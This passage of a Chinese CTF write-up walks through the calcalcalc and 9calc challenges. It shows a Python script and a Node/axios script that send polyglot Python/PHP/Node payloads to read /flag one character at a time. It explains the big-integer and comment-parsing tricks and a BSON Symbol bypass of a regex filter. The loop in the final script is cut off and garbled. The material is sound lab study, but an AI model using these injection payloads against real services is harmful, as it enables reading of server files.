    import string
    def brute(pos, val):
        data = """{"expression":"1//len('''\\n;if([1,0][10000000000000001 - 10000000000000000]){if(require('fs').readFileSync('/flag', 'utf8')[%d]=='%s'){'1';}else{'';} }else{1;}//''') or ['','1'][open('/flag').read()[%d]=='%s']","__proto__":{"b": "114+514"},"isVip": true}""" % (pos, val, pos, val)
        r = requests.post("http://192.168.201.16/calculate", data=data, headers = {'Content-Type': 'application/json'})
        return r.text
        # print(data)
    flag = ''
    for i in range(100):
        for c in string.printable:
            if ("ret" in brute(i, c)):
                flag += c
                print(flag)
                break
先将构造思路中的两个点拆开来说 :
  1. 大整数的不同解析
  2. 对注释的不同解析
##### 对大整数的不同解析
在 node 中，由于其不支持大整数，因此在计算 `10000000000000001 - 10000000000000000` 时，会返回 `0`，而在
php 和 python 中，则能够解析这两者，因此会返回 `1`，这里便可以通过 `10000000000000001 -10000000000000000` 的值来判断执行的语句，对应到我们的 payload 中便是 :
    if([1,0][10000000000000001 - 10000000000000000]{
        ...
        node
        ...
    }else{
        // comment
    }
##### 对注释的不同解析
有关于这一点，将我们的 payload 放入 python 和 php 的语法高亮规则中便能理解。
Python 3:
    open('/flag').read() + str(1//5) or ''' #
    )//?>
    function open(){return {read:()=>require('fs').readFileSync('/flag','utf-8')}}function str(){return 0}/* file_get_contents('/flag').'0']);exit;}?>*///'''
PHP:
    return open('/flag').read() + str(1//5) or ''' #
    )//?>function open(){return {read:()=>require('fs').readFileSync('/flag','utf-8')}}function str(){return 0}/* file_get_contents('/flag').'0']);exit;}?>*///''';
Nodejs:
    open('/flag').read() + str(1//5) or ''' #
    )//?>
    function open(){return {read:()=>require('fs').readFileSync('/flag','utf-8')}}function str(){return 0}/* file_get_contents('/flag').'0']);exit;}?>*///'''
出题人心得：
> Polyglot time.
>
> In RCTF2018, we released `cats` and `cats Rev.2`, you can name this
> challenge as `cats Rev.3`. A new defense technology Cyber Mimic Defense
> (CMD) was proposed in 2018. We think it is interesting to create a polyglot
> challenge based on this idea. So it's polyglot time now.
参考：
另一种思路：
> 还一个思路是，python docker 非常的脆弱，可以通过多进程阻塞打死 python，使其重启，永远 timeout。
>
> node 很容易超时，所以接下来只需要通过 php 来进行获得数据就可以了。
>
> 当 php 超时时，返回 timeout。不超时时，返回 Asahina Mikuru。
### 2019 De1 ta ctf 9calc
同样，和 2019 RCTF 文件对比，主要的改变有下面几点：
  * 修复了时间盲注
  * 正则表达式改动，不允许用户输入括号
注意本题仍然使用 BSON 传递数据，而不是 0CTF 的 JSON
第一步长度绕过和之前的一样。本题的难点就是如何绕过正则检测不允许有空格：
TypeScrit 虽然是强类型语言，但是由于其设计与 Javascript 有关，所有的类型定义在运行的时候会移除，因此 `expression:
string` 我们可以不管，仍然给 expression 传递一个对象 Object。
但是 `object.toString() === '[object Object]'`，测试代码如下：
    var a = {};
    var b = {name:"ZS"};
    console.log(typeof a);//object
    console.log(a.toString());//[object Object]
    console.log(a.toString() === b.toString());//true   说明返回值是一样的
    console.log(b);//Object {name: "ZS"}
这样正则表达式检查 `str`（值为 `'[object Object]'`）是可以通过的。但是我们没有办法让 `object.toString()`
become a useful runnable code。如果前端和后端通过 JSON 进行通信，那这题就真的没办法了，但是
> 我们知道 Nodejs 可以将 JavaScript 函数传递给 MongoDB，而 MongoDB 没有在 JSON 标准中定义。因此他们引入了
> BSON 作为他们的数据交换格式。
幸运的是，我们可以在 javascript 中将对象序列化成 BSON。
审计 `mongodb/js-bson` 的序列化代码 , 可以发现程序会根据 `Object[_bsontype]` 判断类的类型而不是
`instanceof`.
    } else if (value['_bsontype'] === 'Binary') {
            index = serializeBinary(buffer, key, value, index, true);
          } else if (value['_bsontype'] === 'Symbol') {
            index = serializeSymbol(buffer, key, value, index, true);
          } else if (value['_bsontype'] === 'DBRef') {
通过搜索，发现 `Symbol` 类型在 BSON 反序列化得到之后，如果进行 `Symbol.toString()` 会返回 symbol 对象的
value 值，一个示例如下：
    {"expression":{"value":"1+1","_bsontype":"Symbol"}, "isVip": true}
**我的总结** ：绕过括号检测的核心原理是，expression 的值在正则检验的时候是通过 `toString` 转换为字符串，因此对象转的结果是
`'[object Object]'` 可以绕过正则检测。但是传递到后端是通过 bson 的序列化和反序列化之后转换为字符串，这时候对象的
_bsontype 如果是 Symbol，会返回这对象的 value 属性值。
虽然本题的三个 flag 都不一样，但是仍然可以利用回显的差异猜解 flag 文件（类似 bool 注入）。最终的 EXP 利用步骤：
  * 分别针对三个后端构造三种 payload
  * 每个 payload 的功能是（以 nodejs 的为例）：让 python 和 php 后端解析返回的 ret 值都为 1，但是 nodejs 会进行一个 flag 字符猜解，如果等于则让 ret 为 1，如果不等于则让 ret 为 0。其他二个 payload 同理。
EXP 发送的某一次 payload 示例（\n 按照回车输出）
    1 + 0//5 or '''
    //?>
    require('fs').readFileSync('/flag','utf-8')[5] == 'b' ? 1 : 2;/* '1']);exit;}?>*///'''
EXP 如下：
  * 需要使用 `yarn add axios` 命令安装好 _Axios_ ——是一个基于 promise 的 HTTP 库。
    const axios = require('axios')
    const url = 'http://45.77.242.16/calculate'
    const symbols = '0123456789abcdefghijklmnopqrstuvwxyz{}_'.split('')
    const payloads = [
        // Nodejs
        `1 + 0//5 or '''\n//?>\nrequire('fs').readFileSync('/flag','utf-8')[{index}] == '{symbol}' ? 1 : 2;/* '1']);exit;}?>*///'''`,
        // Python
        `(open('/flag').read()[{index}] == '{symbol}') + (str(1//5) == 0) or 2 or ''' #\n))//?>\nfunction open(){return {read:()=>'{flag}'}}function str(){return 0}/* '1']);exit;}?>*///'''`,
        // PHP
        `len('1') + 0//5 or '''\n//?>\n1;function len(){return 1}/* file_get_contents('/flag')[{index}] == '{symbol}' ? "1" : "2"]);exit;}?>*///'''`,
    ]
    const rets = []
    const checkAnswer = (value) => axios.post(url, {
        expression: {
            value,
            _bsontype: "Symbol"
        },
        isVip: true
    }).then(p => p.data.ret === '1').catch(e => {})
    const fn = async () => {
        for (let j = 0; j  {
        console.log(rets.join(''))
    })
参考：